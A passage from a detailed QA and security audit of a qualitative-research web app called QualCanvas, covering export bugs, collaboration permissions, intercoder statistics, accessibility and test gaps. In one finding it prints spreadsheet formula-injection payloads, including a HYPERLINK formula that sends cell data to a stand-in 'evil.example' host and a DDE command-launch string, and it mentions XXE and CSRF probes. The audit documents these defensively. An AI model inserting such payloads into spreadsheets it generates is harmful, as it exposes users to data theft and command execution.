   `GET /auth/export` 403 "Email account required", `DELETE /auth/account` 403, `PUT /auth/profile` 403,
   `PUT /auth/change-password` 403, `POST /auth/resend-verification` 403
   (`userAuthRoutes.ts:884, 971, 777, 846, 540`). The Account page for a code-only session renders only
   PROFILE / "Access Code (Legacy)" / "Link an email →" / PLAN / Sign Out — no export section, no Danger
   Zone, no hint that either exists. Note the headline is narrower than first reported: canvas-level
   export _does_ work (`GET /canvas/:id/export/excel` with a legacy cookie → 200 xlsx). It is the
   account archive and **erasure** that are unavailable.
4. **(medium) Rejected media uploads return HTTP 500 with no explanation — and a plain `.wav` can hit
   it.** `audio/x-wav` → 500, `application/octet-stream` → 500, a 30 MB `audio/wav` (over
   `MAX_UPLOAD_BYTES`) → 500. The multer `fileFilter` (`uploadRoutes.ts:92-98`) rejects with a bare
   `new Error(...)` which the error handler renders as a 500. Reachable from the real UI:
   `AudioUploadModal.tsx:12` filters by **extension** (`.mp3,.wav,.mp4,.m4a,.ogg,.webm,.flac`) while the
   server allow-lists **MIME types** (`audio/wav` but not `audio/x-wav`, `audio/flac` but not
   `audio/x-flac`), and the browser's type string comes from the OS registry. A researcher picks a file
   the picker says is accepted and gets "Internal server error" on their interview recording. The size
   limit is never surfaced either.
5. **(low) Changing your password silently kills the session; the UI keeps pretending you are signed
   in, then bounces you to "session expired".** Server: `Set-Cookie: jwt=; Expires=Thu, 01 Jan 1970 …`
   and the pre-change cookie then 401s. UI (observed live): toast "Password changed", "Sign Out" still
   rendered, `qualcanvas-auth state.authenticated` still true, URL still `/account`; navigating to
   `/canvas` produces two 401s and a hard bounce to `/login?expired=true` rendering "Your session has
   expired. Please sign in again." — causally wrong, and it discards the success toast.
   `handleSaveProfile` (`AccountPage.tsx:203-215`) handles the equivalent email-change case correctly,
   which makes the gap look like an oversight. Local research data is preserved here
   (`api.ts` interceptor passes `preserveLocalData: true`).
6. **(low) The raw access code sits in plaintext in localStorage and nothing ever reads it.** After a UI
   code sign-in, `qualcanvas-auth` contains `"dashboardCode":"CANVAS-EGMYVPTR"`. Every production hit for
   `dashboardCode` is a write or a null-out (`authStore.ts:135` in `setAuth`, plus the type and the three
   clearing sites, plus `LoginPage.tsx:217` passing it in); the only reads are in tests. The codebase
   deliberately moved the JWT out of JS reach ("jwt payload intentionally not stored", `authStore.ts:128/143`),
   yet the access code is a _longer-lived_ credential — it mints fresh Pro sessions on demand and, per
   item 1, survives its own account's deletion.

### 3.4 Collaboration and intercoder reliability

Permissions themselves are solid — 9 viewer-write endpoints, all owner-only operations, socket
mutations re-checked against the DB, and cross-account access all refused correctly. The problems are
around the statistic.

1. **(medium) The panel labels the result "Cohen's κ" while the server always computes Krippendorff's
   α.** With exactly two coders the panel prints "2 selected — Cohen's κ" under a subtitle reading
   "Cohen's κ for two coders, Krippendorff's α for three or more", and the result card directly beneath
   is headed "Krippendorff's α 0.281". The API returns `{"method":"Krippendorff's α","alpha":0.28125,"nCoders":2}`.
   There is **no Cohen path on this endpoint** — `computeCohensKappa` exists at `utils/intercoder.ts:17`
   but its only caller is `trainingRoutes.ts:225`, and `codingRoutes.ts:743` hardcodes the method string.
   `PricingPage.tsx:304` and `:395` sell "Intercoder κ + α"; κ is never computed in this feature.
2. **(medium) At the collaborator plan cap an owner cannot change an existing collaborator's role.**
   Owner on Pro (`maxCollaborators 3`) with 3 collaborators: `POST /collaborators {email: <existing>, role:'viewer'}`
   → `403 PLAN_LIMIT_EXCEEDED current:3 max:3`; promotion is equally blocked. The count at
   `collaborationRoutes.ts:44-56` runs before the upsert and does not exclude the target user. This POST
   is the only role-change path — there is no PUT/PATCH in the file and the Share modal renders role as a
   static badge (`ShareCanvasModal.tsx:206`). A recovery exists (remove, then re-invite, which succeeds)
   but nothing in the UI suggests it, and the error describes a limit the owner is not exceeding.
3. **(medium) An unrecognised `role` value fails open to full editor access and returns 201 as if the
   requested role was applied.** `role:'coder'` (the exact word the UI shows the user), `'owner'`,
   `'admin'` and `'viewer_readonly'` each returned 201 with `"role":"editor"` persisted.
   `collaborationRoutes.ts:38-39`: `validRoles.includes(role) ? role : 'editor'`. Not reachable from
   today's ShareCanvasModal, which only sends `editor`/`viewer` — but a permission boundary that defaults
   to the _more_ privileged value is a defect on its own.
4. **(medium) Inviting a collaborator sends nothing to the invitee.** After three real invites,
   `GET /notifications` returns `{"data":[],"unreadCount":0}` for each, and a direct DB count confirms
   zero `Notification` rows. No email either — `collaborationRoutes.ts:14-89` contains no notification or
   email call. `notifyCanvasShared` is defined at `utils/notifications.ts:76` and **has no call site
   anywhere**. The only signal is the canvas quietly appearing in the invitee's list.
5. **(medium) A Viewer is offered the whole intercoder flow and then refused with a write-permission
   message, for a computation that mutates nothing.** As a viewer: Tools shows "Intercoder agreement
   (κ / α)", the panel opens with a full selectable roster, and Compute gives "You have view-only access
   to this canvas. Ask the owner for coder access." `viewerGuard.ts:25` blocks on HTTP method alone,
   while the agreement handler (`codingRoutes.ts:662`) issues only `findUnique`/`findMany`. The supervisor
   or methods reviewer invited as a Viewer is exactly the person who most wants to read the α.
6. **(low) Selecting the same coder twice returns α = 1.000 over zero units.** `userIds: [owner, owner]`
   → `200 {"method":"Krippendorff's α","alpha":1,"nCoders":1,"nUnits":0,"nObservations":0,"nSegments":6}` —
   a perfect score over nothing, which the panel would render as "1.000 / Almost Perfect Agreement" with
   an Export Report button. `codingRoutes.ts:702` does not dedupe `userIds`; `intercoder.ts:205` collapses
   duplicate coderIds into one Map entry so every unit drops to `m_u = 1`, `D_e = 0`, α = 1
   (`intercoder.ts:216, 245`). The control case (a third coder who has coded nothing) correctly 400s.
   API-surface only — the panel dedupes its roster.
7. **(low) Removing a collaborator drops them from the intercoder roster, so a published α cannot be
   recomputed in-product.** After `DELETE /collaborators/<icb>`, their 4 codings survive (as the confirm
   dialog promises) and the API still returns α = 0.28125 for `[owner, icb]` — but the panel builds its
   roster purely from `GET /collaborators` (`IntercoderPanel.tsx:79-103`), so icb is no longer a
   selectable chip. Recoverable by re-inviting (verified: the chip and the identical 0.281 come back), so
   this is a missing warning in `ShareCanvasModal.tsx:324` rather than destroyed reproducibility.
8. **(low) The exported agreement report identifies a coder as "You" and carries no canvas name or
   date.** Captured download blob: `Intercoder Agreement Report / Method: Krippendorff's α /
Coders (2): You, Verif icb / Transcript: Interview V1 / Score: 0.281 (Fair) / Coding units: 12 /
Observations: 24 / Segments: 6`. The `unattributedCodings` coverage caveat _does_ travel correctly
   when present.
9. **(low) The Share modal shows a collaborator's role as a static badge with no affordance to change
   it** — combined with item 2, the only role-change gesture in the product is retyping the person's
   email into the invite box.

### 3.5 Import, export and sharing

Beyond the ship-blockers. Malformed-input handling is otherwise careful (see the appendix).

1. **(medium) QDPX export can emit a `project.qde` that is not well-formed XML, so no other QDA tool can
   open it.** A transcript containing U+000B, U+000C and U+0001 (stored byte-identically, 201) exports to
   an archive whose `project.qde` contains those bytes raw with zero numeric character references.
   `xml.etree.ElementTree.parse` → `ParseError: not well-formed (invalid token): line 10, column 30`.
   XML 1.0 forbids every C0 control except tab/LF/CR. QualCanvas's own lenient parser re-reads it fine and
   the UI toast says "QDPX exported successfully". `QdpxExportButton.tsx` claims "Tested against NVivo 12
   and ATLAS.ti 8 exports." Real Word/PDF pastes do carry these characters.
2. **(medium) No export carries coder attribution, and the importer discards `<Users>`/`creatingUser`
   without disclosing it.** Source canvas: 7/7 codings have `coderUserId`. After a QDPX round-trip: 0/7.
   After a share-code clone: 0/7. The exported `project.qde` contains no `<Users` and no `creatingUser`.
   An NVivo-style archive carrying both imported as
   `{"success":true,"message":"Imported 1 codes, 1 sources, 1 codings","unsupported":[]}` — no mention of
   the discarded user — with `coderUserId NULL`. The Excel Codings sheet header is
   `Transcript | Code | Coded Text | Start Offset | End Offset | Note | Annotation`; no coder column, and
   none in the Word/HTML/Markdown report either. **A Team's multi-coder work cannot be archived or handed
   on with attribution intact**, which undercuts the intercoder feature.
3. **(medium) CSV transcript upload imports the header row as a transcript.**
   `parseTranscriptFile('interviews.csv', 'Title,Content\n"Interview 1","first content"\n…')` returns
   `[{"title":"Title","content":"Content"}, …]`. `transcriptFiles.ts:35-42` has no header detection, while
   `SurveyImportModal.tsx:65-112` treats `rows[0]` as headers and offers column mapping — the two CSV
   paths disagree. Every CSV out of Excel, Sheets, Qualtrics or SPSS has a header row, so the default
   outcome is a junk transcript that consumes a plan slot and pollutes word counts and coverage.
4. **(medium) Share codes can never be given an expiry, though the expiry machinery is fully
   implemented.** `POST /canvas/:id/share {}` → 201 `expiresAt: null`; passing `expiresAt` explicitly is
   ignored (the handler builds the row from `canvasId` + `shareCode` + `createdBy` only,
   `shareRoutes.ts:25-31`); `grep expiresAt apps/frontend/src` → zero hits, so there is no UI path either.
   Both 410 enforcement checks (`shareRoutes.ts:80` clone, `:265` public read) are dead code. For a tool
   holding participant interview text under ethics approval, a permanent-by-default link is a governance
   gap.
5. **(medium) Re-importing the same QDPX silently duplicates everything.** A second import of an
   identical archive into a canvas that already held its contents took codes 2 → 4, transcripts 1 → 2,
   codings 1 → 2, and both responses read "Imported 2 codes, 1 sources, 1 codings". No GUID-based dedupe,
   no warning. A double-click on Import doubles the codebook.
6. **(low) QDPX offsets are UTF-16 code-unit indices with no declared convention.** A 121-UTF-16-unit /
   116-code-point transcript with 5 astral characters: slicing the exported `PlainTextContent` at the
   exported positions with code-point indexing bleeds 5 characters past the coded excerpt; slicing as
   UTF-16 reproduces it exactly. The dominant QDA implementations also count UTF-16, so QualCanvas is
   aligned with the majority — the defect is only that nothing says so.
7. **(low) Cloning a shared canvas discards the entire canvas layout.** `PUT /canvas/:id/layout` with two
   positions → 2 `CanvasNodePosition` rows; the clone has 0. `shareRoutes.ts:144-234` copies cases,
   transcripts, questions, memos, codings, relations and computed nodes and never touches
   `CanvasNodePosition`. `useAutoLayout` means the recipient still gets a usable canvas, so the author's
   arrangement is lost but no data is.
8. **(low) The export paywall names the wrong plans, and the _import_ path tells you about export.** On a
   genuinely free account: `export/qdpx` → 403 "QDPX export is available on Pro and Team plans",
   `export/excel` → 403 "XLSX export is available on Pro and Team plans", and
   **`POST import/qdpx` → 403 with that same QDPX _export_ message**. On a Student account both exports
   return 200 (635 bytes qdpx, 8,321 bytes xlsx). The message is a template at `planLimits.ts:487-493`
   that hardcodes "Pro and Team" regardless of format, while `QdpxExportButton.tsx:18` already says the
   correct thing — backend and frontend contradict each other.
9. **(low) A wrong-extension (or extension-less) file on QDPX import returns HTTP 500 "Internal server
   error".** A byte-identical valid QDPX under `evil.exe` → 500; under `noext` → 500; under
   `export.qdpx`/`export.zip` → 200. A genuinely non-ZIP body under a `.qdpx` name correctly 400s
   ("not a valid ZIP archive"). `qdpxRoutes.ts:17-26` calls the multer `cb` with a plain `Error` that
   never maps to a 4xx; `QdpxImportModal.tsx:35` then shows the toast "Internal server error". Mitigated
   by `accept=".qdpx,.zip"` on the input.
10. **(low) QDPX export reports success while silently dropping memos, cases, relations, computed nodes,
    coding notes, annotations, coder attribution and AI provenance.** Grepping a real export for
    `<Users`, `creatingUser`, `<Memo`, `<Note`, `<Case`, `<Variable`, `<Link`, `<Graph`, `annotation`,
    `coder` — all absent; re-importing gives 0 memos, 0 cases, 0 notes, 0 coderUserIds. The toast says
    "QDPX exported successfully". The _import_ path goes to real trouble to disclose what it dropped
    (`qdpxRoutes.ts:87-104`, "not imported: 1 variable, 1 case, 1 note, 1 picture source"); the asymmetry
    is the tell.
11. **(low) The unauthenticated shared-canvas endpoint leaks the owner's internal ids and every coder
    id.** `GET /api/v1/canvas/shared/SHARE-XXXX` with no cookie → 200 with the raw Prisma row spread into
    the response (`shareRoutes.ts:281-292`): `userId`, `dashboardAccessId`, `ethicsApprovalId`,
    `dataRetentionDate`, `deletedAt`, plus `coderUserId` on every coding. Opaque CUIDs, not credentials —
    but combined with never-expiring share codes they are harvestable indefinitely.
12. **(low, improvement) CSV exports lack the spreadsheet-formula guard the xlsx export deliberately
    implements.** `buildCodebookCsv`/`buildDataCsv` emit
    `"=HYPERLINK(""http://evil.example/?d=""&A1,""Click"")"` and `"=cmd|' /C calc'!A0"` quoted only;
    `buildDataTsv` emits them bare. RFC-4180 quoting does not stop Excel evaluating on open.
    `excelExport.ts:1-40` documents the leading `=+-@` problem and pins such cells to Text format;
    `delimitedText.ts:18` should do the same.

### 3.6 Cross-cutting quality

1. **(medium) The collapsed code sidebar keeps 9 invisible controls in the tab order at ≤768px.** At both
   768×1024 and 375×667, Tab stops **6 through 14** land inside
   `<div class="transition-all duration-200 overflow-hidden w-0">` — 0 px wide, 915 px tall. The nine:
   "Codes (N)", "Sources (N)", the "Filter codes…" input, "By count", "A-Z", two unnamed 20×12 buttons, a
   `div[tabindex]` code row, and an unnamed 16×16 button. Each has a non-zero own box while its container
   is clipped, so the focus ring is invisible: nine keypresses with no feedback and no idea where you are.
   The collapsed branch in `CanvasWorkspace.tsx` uses `w-0` + `overflow-hidden` with no `inert`,
   `aria-hidden` or `display:none`.
2. **(medium) A deep link to a canvas while logged out loses the destination.**
   `/canvas/<id>` with no cookies → `/login` with no `?redirect=` and no router state; after a successful
   sign-in you land on `/canvas` (the list). `App.tsx:46-49` returns `<Navigate to="/login" replace />`
   with no `state={{from: location}}`, and `LoginPage.tsx` hardcodes `navigate('/canvas')` at lines 93,
   168, 201 and 219 — all four success paths. This is the invited-collaborator path from an email link.
3. **(medium) Malformed or oversized JSON bodies return 500 instead of 400/413 — and a >1MB transcript on
   `/api/v1` hides the real plan-limit message.**
   - `-d '{"name":'` → `500 {"error":"Internal server error","requestId":"f24213e1-…"}` on both prefixes.
   - A 1,308,030-byte transcript body to `/api/v1/canvas/<id>/transcripts` → **500**.
   - The byte-identical body to `/api/canvas/<id>/transcripts` → **403** with the useful
     `{"error":"Free plan allows 10,000 words per transcript","current":218000,"max":10000}`.
     `index.ts:180-182` mounts the 10 MB parser on the literal path `/api/canvas/:id/transcripts` only;
     `index.ts:185` then applies the global 1 MB limit, and `index.ts:437-438` mounts the same router under
     both prefixes — so the documented `/api/v1` prefix never reaches the larger limit.
     `errorHandler.ts:23-72` has no branch for `entity.too.large` / `entity.parse.failed` and none honouring
     a non-`AppError` `err.status`, so both fall through to `logError` + a blanket 500 — meaning every
     truncated or oversized request also pages the team through Sentry as a server fault.
4. **(medium) Reloading a canvas with the API unreachable renders a full, populated canvas with no
   offline indicator — and the status chip still says "Saved" and "connected".** 17 requests aborted
   (canvas, canvas list, auth/me, onboarding, notifications, ai-settings, events, layout); result
   `{codes:"Codes (1)", nodes:5, anyError:false, matched:[], statusBar:["Saved","connected"]}`. Nothing in
   the page matches `/offline|unavailable|retry|failed to load|connection lost/`. Offline rendering looks
   intentional; the missing signal — and the false "Saved"/"connected" — is the problem.
5. **(medium) Canvas list: the sort `<select>` has no accessible name, and each canvas card is a
   `div[role=button]` wrapping a real `<button>`.** axe (after waiting for render):
   `[critical] select-name (1)`, `[serious] nested-interactive (2)` (one per card). Direct inspection of
   the select: `{aria:null, id:"", labelFor:false, wrapped:false, title:"", opts:["Newest first","A-Z","Most codings"]}` —
   no name by any mechanism. Card: `{aria:"Open canvas VJ6 Audit Canvas", tabindex:0, innerButtons:["Delete canvas VJ6 Audit Canvas"]}`.
6. **(medium) Muted grey text fails contrast across the app.** Measured ratios (light mode, 1440×900):
   `#9ca3af` on `#ffffff` at 12px = **2.53:1** ("Sign out", canvas-card metadata rows); `#9ca3af` on
   `#f9fafb` at 10px = **2.42:1** (the `/account` usage hints "5 per canvas", "10 per canvas");
   `#9ca3af` on `#f9fafb` at 14px = **2.42:1** ("No repositories yet.", "Select a repository to view its
   insights"); `#d97706` on `#ffffff` at 12px = **3.18:1** (the "Unverified" email badge). AA requires
   4.5:1. Several of these are empty-state copy — the text a new user most needs to read.
7. **(low) Whitespace-only content is accepted where empty content is correctly rejected, on both
   transcripts and codes.** `{"content":""}` → `400 {"details":{"content":["Transcript content is required"]}}`;
   `{"content":"   \n   \n  "}` → **201**, rendering as a node reading "Whitespace Only / 0 words",
   counting toward "Sources (N)" and toward the plan's 5-transcripts cap. Worse on the core object:
   `POST /canvas/<id>/questions -d '{"text":"   "}'` → **201**, creating a code whose entire visible text
   is "0c" — an unnamed node, a blank row in the code navigator, one of the Free plan's 10 codes consumed,
   and an empty string in the exported codebook. The toolbar guards this client-side
   (`CanvasToolbar.tsx:327`), so it is reachable via the API and imports. Cause in both cases:
   `z.string().min(1)` with no `.trim()` (`validation.ts:95`).
8. **(low) Internal "question" terminology leaks into user-facing strings, on both the success and the
   error path.** Within a single interaction the product says "code" three times (button title
   "Add a code — a label you apply to passages…", placeholder "Name a new code…", sidebar "Codes (N)")
   and then, at the only moment the user needs to understand what happened, toasts **"Failed to add
   question"** (`CanvasToolbar.tsx:335`, `CanvasWorkspace.tsx:2032`). The happy path leaks too —
   `CanvasToolbar.tsx:333` is `toast.success('Question added')`. Three more strings at
   `CanvasWorkspace.tsx:1176, 1231, 2004` say "drag to a question" / "between cases/questions".

---

## 4. Unproven

Kept separate from everything above. These were measured but not settled.

- **The signup-500 orphan account.** The 500 itself is reproducible and severe (SB-12). The _committed_
  orphan state is not: 21 verifier-induced 500s all rolled back cleanly. The first round's artifact is
  still in the database (`j4aug23-d`, `createdAt 12:37:38.967`, `DashboardAccess` + `EmailPreference`
  present, no `auth.signup` AuditLog row where all six sibling accounts have one), which is consistent
  with a throw _after_ the transaction committed — but `logAudit` (`middleware/auditLog.ts:54`) swallows
  its own errors and is not awaited, so the missing row could equally be an independent pool-exhaustion
  drop. **Unknown: the throw site, and whether the orphan path can recur.**
- **Whether the offline cached render can disagree with the server.** The first round observed
  "Codes (0)" rendered while `GET /canvas/<id>` returned one code; the verifier ran the same sequence and
  the cached view agreed with the server. The missing-offline-signal defect (§3.6 item 4) is confirmed;
  the stale-data escalation is **not demonstrated** and should not be treated as such.
- **Whether the Statistics node displays `coverage` on screen.** The two divergent denominators (§3.1
  item 2) and the 166,616.7% figure (SB-5) are proven in the API result and in `richExportContent`'s
  report table, which _is_ user-visible. Whether `StatsNode.tsx` renders the `coverage` field itself was
  never established — the first agent read the component and said it does not.
- **Whether real NVivo / ATLAS.ti accept or reject QualCanvas archives.** Only well-formedness was
  measured (with Python `xml.etree`). No commercial tool was in the loop, so the "Tested against NVivo 12
  and ATLAS.ti 8" claim on the export button is neither confirmed nor refuted.
- **Safari focus behaviour and real screen-reader output.** All accessibility work was programmatic in
  Chromium. `#canvas-main` has no `tabindex="-1"`, which historically breaks the skip link in Safari; the
  skip link _does_ work in Chromium. No NVDA/VoiceOver pass was made.
- **Dark mode.** axe was run in light mode only; the contrast findings may differ.
- **Auth rate limiting.** `authLimiter` is a pass-through when `E2E_TEST=true`
  (`middleware/authLimiter.ts:37`), so nothing about brute-force protection was tested.
- **CSRF / Origin enforcement.** `middleware/csrf.ts:26-29` no-ops when `ALLOWED_ORIGINS` is unset, which
  is the local case — a `PUT /auth/profile` with `Origin: https://evil.example.com` returned 200. Not a
  defect locally, and production relies on SameSite=Lax plus that check, but **the production
  configuration was not exercised**.
- **Google OAuth.** No valid credential locally. The passwordless account shape was simulated by setting
  `passwordHash=''`, which exercises the real `hasPassword=false` branches; **no claim is made about the
  handshake itself**.
- **Live Stripe / real paid upgrade.** Every plan change was made directly in the local database.

---

## 5. Improvements

Ranked by value to a researcher, not by effort.

1. **Tell users what their plan includes before they click, and make the upgrade path reachable.** Three
   independent defects stack into one dead end: no badges on the 6 gated Analyze tools or the Team-only
   intercoder entry (§3.2 items 5–6), a 5-minute prompt suppression that degrades every subsequent
   refusal to "Failed to add node" (§3.2 item 4), and an upgrade modal that renders underneath every
   canvas panel (§3.2 item 1). Fixing any one alone leaves the funnel broken.
2. **Define "coverage" once, name its denominator on every surface, and roll child codings up to parent
   themes** in the Codebook, the CSV, `computeStats` and the rich report. Today the same code reads 0.3%
   and 12.6%, and a theme with five coded excerpts exports as zero (§3.1 items 1–2).
3. **State the method and its limits next to every derived number.** Sentiment is a bare AFINN lookup
   diluted by excerpt length and says so nowhere (§3.1 item 4); the intercoder panel names a coefficient
   it does not compute (§3.4 item 1). A research tool's numbers get quoted in write-ups.
4. **Carry coder attribution through every export** — `<Users>`/`creatingUser` in QDPX, a coder column in
   Excel, and real names plus canvas and date in the agreement report (§3.5 item 2, §3.4 item 8).
   Multi-coder work is the feature Team is sold on and it cannot currently be archived.
5. **Disclose loss on the export side the way the import side already does** (§3.5 item 10). The import
   path's "not imported: 1 variable, 1 case, 1 note, 1 picture source" is the right standard.
6. **Give share codes an expiry.** The column and both 410 checks already exist and are dead (§3.5
   item 4). Participant transcripts behind a permanent link is an ethics problem, not a convenience gap.
7. **Notify invitees.** `notifyCanvasShared` is written, exported and has zero callers (§3.4 item 4).
8. **Persist viewport zoom and pan** alongside node positions (§3.1 item 7). On a wide canvas every
   reload throws away where the user was reading.
9. **Surface quota where the work happens** — a count on the dashboard and in the create form, not only
   on `/account` (§3.2 item 9) — and render over-cap states as text rather than "1/0" (§3.2 item 11).
10. **Apply the xlsx formula-injection guard to CSV and TSV** (§3.5 item 12).
11. **Preserve the deep link through login** (§3.6 item 2) — this is the collaborator's first experience.
12. **Copy `CanvasNodePosition` on clone** (§3.5 item 7). Spatial arrangement is the product's metaphor.
13. **Rename "question" to "code" in every user-facing string** (§3.6 item 8), including the success toast.
14. **Trim in validation** so whitespace-only transcripts and codes are rejected like empty ones
    (§3.6 item 7), and **accept `parentQuestionId` on `POST /questions`** (§3.1 item 5).
15. **Move the access-code bcrypt out of the signup transaction** (SB-12) and map body-parser errors to
    400/413 in `errorHandler.ts` (§3.6 item 3) so client mistakes stop paging the team.

---

## 6. Coverage and gaps

### Exercised

- **Signup and first run:** landing page, `/login?mode=register`, real form signup, redirect, the
  two-screen onboarding wizard (including correct resume after a full browser restart), blank-canvas
  creation, empty state, and the "Get started" checklist progressing 0 → 3 → 4 of 5.
- **Content:** transcript ingest by paste and by `.txt` upload (newlines verified in Postgres), code
  creation via UI and API, nesting under parent themes, 7 codings with exact offsets, all four free
  analyses run, all six gated ones refused, auto-arrange, codebook and coded-data CSV downloads, reload
  and full sign-out/sign-in with no data loss (8 codes / 2 sources / 7 codings / 24% coded / 15 nodes
  before and after).
- **Numbers hand-checked against `CanvasTextCoding`:** per-code counts, percentages and character
  coverage; Text Search offsets; Word Cloud counts; Krippendorff's α recomputed by hand (0.6875) matching
  the server exactly.
- **Plan limits:** every documented free ceiling probed against the live API with no off-by-one (10,000
  words accepted / 10,001 refused), plus side doors — trash, restore, clone-from-share, cross-canvas
  import, bulk narrative import, templates, collaborator invites, legacy registration, account linking,
  and two simultaneous creates at 1/2 (exactly one 201, one 403).
- **Both auth systems, full lifecycle:** legacy registration and code sign-in through the real UI,
  grandfathered Pro, email linking, profile edit, verification, resend, change password, forgot/reset
  password, GDPR export, and account deletion across five variants (password, email-confirmation for a
  passwordless account, keep-legacy, delete-legacy, trashed legacy) — each DB- and disk-verified.
- **Collaboration:** invite by email as Coder and Viewer through the API and the real Share modal, the
  invitee's side, `viewerWriteGuard` on 9 write endpoints, owner-only operations as a Coder, removal and
  `canvas:access-revoked`, and three concurrent real socket.io clients for presence, coding broadcast,
  cursor moves and live role demotion.
- **Interchange:** QDPX export/import round-trips with hostile content (XML metacharacters, CJK, emoji
  including ZWJ, Latin-1, tabs, CRLF, C0 controls, blank-line runs), 10+ hand-built malformed archives,
  an NVivo-style archive with `internal://` paths, Excel read back with ExcelJS, Word/HTML/Markdown
  generated and grepped, all four transcript formats through the real parsers, and the full share →
  clone flow across two accounts with a field-by-field diff.
- **Cross-cutting:** 375 / 768 / 1440 (no horizontal overflow at any width), 70 Tab stops on the canvas
  and 22 on the list, axe-core 4.x on 7 routes, 404 / foreign-canvas / nonexistent-canvas / logged-out
  deep links, browser Back mid-flow and after sign-out, empty and 5,000-word and 20,000-word transcripts,
  and aborted-API behaviour for add-code, node drag and full reload.

### Not reached — do not read this report as a clean bill of health for these

- **Transcript text-selection → QuickCodePopover.** The documented harness limitation (React Flow
  intercepts the drag as a pan). All codings were created through `POST /canvas/:id/codings`, the same
  route the popover calls, so the _route_ is well covered and the selection → popover → code interaction
  is **entirely unverified**. Test it by hand before release.
- **AI and auto-code.** Free has `aiEnabled: false`; hosted AI needs `OPENAI_API_KEY` +
  `HOSTED_AI_ENABLED`. Only the gating and the daily-cap arithmetic were exercised, never a real
  suggestion, auto-code run, chat or summary.
- **The templated first-run path.** `CanvasTemplate` has 0 rows in the e2e database, so onboarding
  screen 2 offered only "Blank canvas" despite copy promising starter codes and a sample transcript and
  an "Include sample data" checkbox with nothing to apply. An environment gap, not a defect — but the
  templated first run is untested here.
- **Audio transcription end-to-end**, Team/Institutional tiers, Stripe subscription cancellation on
  delete, and the lifecycle/unsubscribe email flows.
- **Real assistive technology, Safari, dark mode, print styles, 200% zoom.** Reduced motion is covered by
  PR #77 per project notes and was not retested.
- **More than 3 coders in one agreement comparison**, and legacy access-code users as collaborators (they
  cannot be — `viewerGuard.ts:28` returns early without a userId).
- **Production configuration** for CSRF, rate limiting, OAuth and Stripe (see §4).

### Environment notes for anyone reproducing this

- The Vite dev server crashed repeatedly during the audit with an unhandled `Error: read ECONNRESET`
  when a browser connection closed abruptly. Dev tooling only — production serves static files from
  Cloudflare Pages — but agents lost significant time to it, and one instance came back on a **fallback
  port**.
- The backend's non-production CORS allowlist is the hardcoded literal
  `['http://localhost:5174','http://localhost:3007']` (`apps/backend/src/utils/origins.ts`). A browser
  pointed at any other port gets every API call blocked, which is easy to misread as an auth failure.
- `POST /auth/email-login` **rewrites `User.plan` to `'free'`** unless an active/trialing Subscription or
  `legacyPricing` exists (`userAuthRoutes.ts:190-193`). A plan set directly in the database evaporates on
  the next login; set `legacyPricing=true` to hold it.
- `POST /canvas/:id/questions` silently drops `parentQuestionId` — build hierarchies with `PUT`.

---

## Appendix — Checked and found not to be problems

Two findings were refuted **as originally stated** and survive above only in reduced form: the
collaborator-removal claim ("permanently un-comparable") — re-inviting restores the chip and the
identical α, so it is a missing warning, not destroyed reproducibility (§3.4 item 7); and the
offline-reload claim — the stale-data escalation did not reproduce, though the missing offline
signal did (§3.6 item 4, §4). The rest below were chased and cleared. Recorded so nobody re-chases
them.

- **Krippendorff's α arithmetic** — recomputed by hand from the observation table (D_o = 4/36,
  D_e = 2·8·28/(36·35), α = 0.6875); matches the server exactly.
- **Zero-variance α = 1** when both coders apply the same one code to every paragraph — the documented
  D_e = 0 convention, and the coders genuinely agreed.
- **Permissions and authorization** — 9 viewer-write endpoints, all owner-only operations, socket writes
  re-checked against the DB on every mutation, another user's canvas 403, a bogus id 404, and the
  cross-account IDOR on `import-from-canvas` 403.
- **Password and recovery flows** — no user enumeration (identical bodies, latency equalised at ~0.46 s),
  single-use reset tokens, replay rejected, sessions invalidated, pre-reset session 401s.
- **Free-tier boundary arithmetic** — every cap exact, no off-by-one; concurrent creates at 1/2 produced
  exactly one 201 and one 403 with no over-delete; trash frees a slot and restore is correctly re-gated;
  collaborator canvases do not consume your own cap; QDPX import is gated so it cannot be an import side
  door on Free.
- **The Account page usage meter** — deliberately sets `max=null` for transcripts/codes and renders
  "N per canvas" as a hint rather than dividing account totals by per-canvas caps
  (`AccountPage.tsx:700-741`, with a comment explaining the earlier bug it fixed).
- **Legacy users sharing a global AI daily counter** — refuted; `planLimits.ts:328-334` rejects any
  request with no `req.userId` before the count runs (verified: 403 `EMAIL_ACCOUNT_REQUIRED`).
- **`PUT /layout` firing on plain page load clobbering a stored arrangement** — refuted; with a
  distinctive layout stored and no user interaction, the outgoing body echoed `{"x":1234,"y":4321}`
  unchanged. It is a benign re-persist of client-measured node sizes.
- **Duplicate GETs on every canvas load** — React 18 StrictMode double-invoking effects in dev
  (`main.tsx:199`), not a production defect.
- **Malformed QDPX handling** — XXE blocked with a specific message, billion-laughs neutralised, zip-bomb
  caps enforced on declared and actual sizes, and a duplicate-GUID file rolled the all-or-nothing
  transaction back leaving the canvas untouched.
- **The Word / HTML / Markdown rich export** — CJK, emoji, accented text and escaped metacharacters all
  survive intact in `word/document.xml`.
- **The Excel export** — clean, complete, and already guards against spreadsheet formula injection.
- **Share-clone content fidelity** — transcript text byte-identical, every coding invariant intact, notes
  and annotations preserved (only `source`, `coderUserId` and layout are lost, reported separately).
- **Post-trial abandonment** — refuted; `/canvas` renders "Your Pro trial ended. Your data is safe, but
  new canvases, codes, and analyses are now limited to the Free tier." with an Upgrade button.
- **Onboarding "restarts at step 1" after a browser restart** — a harness artefact (two agents sharing a
  `state.json`); it resumes correctly, server-persisted via `PATCH /user/onboarding`.
- **`CanvasTextCoding.coder` on collaborator removal** — `onDelete: SetNull` (`schema.prisma:305`), and
  the agreement endpoint deliberately filters NULL coders and reports an `unattributedCodings` count
  (`codingRoutes.ts:685-686`), disclosed both in the panel and in the exported report. No α is silently
  corrupted.
- **The legacy `IntercoderReliabilityModal`** — imported in `CanvasToolbar` but its state is never set
  true; unreachable dead code.
- **Public marketing pages** (`/`, `/login`, `/pricing`, 404) — **zero** axe violations under
  wcag2a/2aa/21a/21aa. The accessibility debt is concentrated entirely behind the login.
- **The "Origin header is required" premise** — false locally, and correctly so: `csrf.ts:26-29` no-ops
  when `ALLOWED_ORIGINS` is unset.
- **The Vite dev-server crash** — dev tooling, not the shipped app.
